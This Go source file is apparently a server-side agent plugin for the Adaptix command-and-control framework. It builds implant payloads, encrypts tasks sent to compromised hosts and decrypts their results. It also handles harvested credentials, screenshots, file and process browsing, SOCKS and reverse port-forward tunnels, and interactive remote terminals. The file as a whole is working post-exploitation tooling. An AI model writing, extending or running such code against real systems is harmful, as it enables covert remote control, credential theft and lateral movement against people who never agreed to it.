package main

import (
	"encoding/hex"
	"encoding/json"
	"math/rand"
	"time"
	"io"

	ax "github.com/Adaptix-Framework/axc2"
)

const (
	OS_UNKNOWN = 0
	OS_WINDOWS = 1
	OS_LINUX   = 2
	OS_MAC     = 3

	TYPE_TASK       = 1
	TYPE_BROWSER    = 2
	TYPE_JOB        = 3
	TYPE_TUNNEL     = 4
	TYPE_PROXY_DATA = 5

	MESSAGE_INFO    = 5
	MESSAGE_ERROR   = 6
	MESSAGE_SUCCESS = 7

	DOWNLOAD_STATE_RUNNING  = 1
	DOWNLOAD_STATE_STOPPED  = 2
	DOWNLOAD_STATE_FINISHED = 3
	DOWNLOAD_STATE_CANCELED = 4
)

type Teamserver interface {
	TsAgentIsExists(agentId string) bool
	TsAgentCreate(agentCrc string, agentId string, beat []byte, listenerName string, ExternalIP string, Async bool) (ax.AgentData, error)
	TsAgentProcessData(agentId string, bodyData []byte) error
	TsAgentUpdateData(newAgentData ax.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error

	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error
	TsAgentSetTick(agentId string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsAgentGetHostedAll(agentId string, maxDataSize int) ([]byte, error)
	TsAgentGetHostedTasks(agentId string, maxDataSize int) ([]byte, error)
	TsAgentGetHostedTasksCount(agentId string, count int, maxDataSize int) ([]byte, error)

	TsTaskRunningExists(agentId string, taskId string) bool
	TsTaskCreate(agentId string, cmdline string, client string, taskData ax.TaskData)
	TsTaskUpdate(agentId string, updateData ax.TaskData)

	TsTaskGetAvailableAll(agentId string, availableSize int) ([]ax.TaskData, error)
	TsTaskGetAvailableTasks(agentId string, availableSize int) ([]ax.TaskData, int, error)
	TsTaskGetAvailableTasksCount(agentId string, maxCount int, availableSize int) ([]ax.TaskData, int, error)
	TsTasksPivotExists(agentId string, first bool) bool
	TsTaskGetAvailablePivotAll(agentId string, availableSize int) ([]ax.TaskData, error)

	TsClientGuiDisks(taskData ax.TaskData, jsonDrives string)
	TsClientGuiFiles(taskData ax.TaskData, path string, jsonFiles string)
	TsClientGuiFilesStatus(taskData ax.TaskData)
	TsClientGuiProcess(taskData ax.TaskData, jsonFiles string)

	TsCredentilsAdd(creds []map[string]interface{}) error
	TsCredentilsEdit(credId string, username string, password string, realm string, credType string, tag string, storage string, host string) error
	TsCredentialsSetTag(credsId []string, tag string) error
	TsCredentilsDelete(credsId []string) error

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadDelete(fileid []string)
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error
	TsDownloadGetFilepath(fileId string) (string, error)
	TsUploadGetFilepath(fileId string) (string, error)
	TsUploadGetFileContent(fileId string) ([]byte, error)

	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsGetPivotByName(pivotName string) *ax.PivotData
	TsGetPivotById(pivotId string) *ax.PivotData
	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsPivotDelete(pivotId string) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error
	TsScreenshotNote(screenId string, note string) error
	TsScreenshotDelete(screenId string) error

	TsTargetsAdd(targets []map[string]interface{}) error
	TsTargetsCreateAlive(agentData ax.AgentData) (string, error)
	TsTargetsEdit(targetId string, computer string, domain string, address string, os int, osDesk string, tag string, info string, alive bool) error
	TsTargetSetTag(targetsId []string, tag string) error
	TsTargetRemoveSessions(agentsId []string) error
	TsTargetDelete(targetsId []string) error

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)

	TsTerminalConnExists(terminalId string) bool
	TsTerminalGetPipe(AgentId string, terminalId string) (*io.PipeReader, *io.PipeWriter, error)
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalConnClose(terminalId string, status string) error

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string
}

type PluginAgent   struct{}
type ExtenderAgent struct{}

type ModuleExtender struct {
	ts  Teamserver
	pa  PluginAgent
	ext ExtenderAgent
}

var (
	ModuleObject   *ModuleExtender
	ModuleDir      string
	AgentWatermark string
)

func (p* PluginAgent) GetExtender() ax.ExtenderAgent {
	return &ModuleObject.ext
}

func InitPlugin(ts any, moduleDir string, watermark string) ax.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark

	ModuleObject = &ModuleExtender{
		ts: ts.(Teamserver),
	}
	return &ModuleObject.pa
}

func (pa* PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var (
		listenerMap  map[string]any
		agentProfile []byte
		err          error
	)

	// err = json.Unmarshal(profile., &listenerMap)
	// if err != nil {
		// return nil, "", err
	// }

	agentProfile, err = AgentGenerateProfile(profile.AgentConfig, string(agentProfiles), listenerMap)
	if err != nil {
		return nil, "", err
	}

	return AgentGenerateBuild(profile.AgentConfig, agentProfile, listenerMap)
}

func (m *ModuleExtender) AgentCreate(beat []byte) (ax.AgentData, error) {
	return CreateAgent(beat)
}

func (m *ModuleExtender) CreateCommand(agentData ax.AgentData, args map[string]any) (ax.TaskData, ax.ConsoleMessageData, error) {
	return CreateTask(m.ts, agentData, args)
}

func (m *ModuleExtender) AgentPackData(agentData ax.AgentData, tasks []ax.TaskData) ([]byte, error) {
	packedData, err := PackTasks(agentData, tasks)
	if err != nil {
		return nil, err
	}

	return AgentEncryptData(packedData, agentData.SessionKey)
}

func (m *ModuleExtender) AgentPivotPackData(pivotId string, data []byte) (ax.TaskData, error) {
	packData, err := PackPivotTasks(pivotId, data)
	if err != nil {
		return ax.TaskData{}, err
	}

	randomBytes := make([]byte, 16)
	rand.Read(randomBytes)
	uid := hex.EncodeToString(randomBytes)[:8]

	taskData := ax.TaskData{
		TaskId: uid,
		Type:   TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, nil
}

func (m *ModuleExtender) ProcessData(agentData ax.AgentData, packedData []byte) ([]byte, error) {
	decryptData, err := AgentDecryptData(packedData, agentData.SessionKey)
	if err != nil {
		return nil, err
	}

	taskData := ax.TaskData{
		Type:        TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	resultTasks := ProcessTasksResult(m.ts, agentData, taskData, decryptData)

	for _, task := range resultTasks {
		m.ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil, nil
}

/// SYNC

func SyncBrowserDisks(ts Teamserver, taskData ax.TaskData, drivesSlice []ax.ListingDrivesDataWin) {
	jsonDrives, err := json.Marshal(drivesSlice)
	if err != nil {
		return
	}

	ts.TsClientGuiDisks(taskData, string(jsonDrives))
}

func SyncBrowserFiles(ts Teamserver, taskData ax.TaskData, path string, filesSlice []ax.ListingFileDataWin) {
	jsonDrives, err := json.Marshal(filesSlice)
	if err != nil {
		return
	}

	ts.TsClientGuiFiles(taskData, path, string(jsonDrives))
}

func SyncBrowserFilesStatus(ts Teamserver, taskData ax.TaskData) {
	ts.TsClientGuiFilesStatus(taskData)
}

func SyncBrowserProcess(ts Teamserver, taskData ax.TaskData, processlist []ax.ListingProcessDataWin) {
	jsonProcess, err := json.Marshal(processlist)
	if err != nil {
		return
	}

	ts.TsClientGuiProcess(taskData, string(jsonProcess))
}

/// TUNNEL

func (m *ModuleExtender) AgentTunnelCallbacks() (func(channelId int, address string, port int) ax.TaskData, func(channelId int, address string, port int) ax.TaskData, func(channelId int, data []byte) ax.TaskData, func(channelId int, data []byte) ax.TaskData, func(channelId int) ax.TaskData, func(tunnelId int, port int) ax.TaskData, error) {
	return TunnelMessageConnectTCP, TunnelMessageConnectUDP, TunnelMessageWriteTCP, TunnelMessageWriteUDP, TunnelMessageClose, TunnelMessageReverse, nil
}

func TunnelMessageConnectTCP(channelId int, address string, port int) ax.TaskData {
	packData, _ := TunnelCreateTCP(channelId, address, port)

	taskData := ax.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageConnectUDP(channelId int, address string, port int) ax.TaskData {
	packData, _ := TunnelCreateUDP(channelId, address, port)

	taskData := ax.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageWriteTCP(channelId int, data []byte) ax.TaskData {
	packData, _ := TunnelWriteTCP(channelId, data)

	taskData := ax.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageWriteUDP(channelId int, data []byte) ax.TaskData {
	packData, _ := TunnelWriteUDP(channelId, data)

	taskData := ax.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageClose(channelId int) ax.TaskData {
	packData, _ := TunnelClose(channelId)

	taskData := ax.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

func TunnelMessageReverse(tunnelId int, port int) ax.TaskData {
	packData, _ := TunnelReverse(tunnelId, port)

	taskData := ax.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData
}

/// TERMINAL

func (m *ModuleExtender) AgentTerminalCallbacks() (func(int, string, int, int) (ax.TaskData, error), func(int, []byte) (ax.TaskData, error), func(int) (ax.TaskData, error), error) {
	return TerminalMessageStart, TerminalMessageWrite, TerminalMessageClose, nil
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int) (ax.TaskData, error) {
	packData, err := TerminalStart(terminalId, program, sizeH, sizeW)
	if err != nil {
		return ax.TaskData{}, err
	}

	taskData := ax.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}

func TerminalMessageWrite(channelId int, data []byte) (ax.TaskData, error) {
	packData, err := TerminalWrite(channelId, data)
	if err != nil {
		return ax.TaskData{}, err
	}
	taskData := ax.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}

func TerminalMessageClose(terminalId int) (ax.TaskData, error) {
	packData, err := TerminalClose(terminalId)
	if err != nil {
		return ax.TaskData{}, err
	}

	taskData := ax.TaskData{
		Type: TYPE_PROXY_DATA,
		Data: packData,
		Sync: false,
	}

	return taskData, nil
}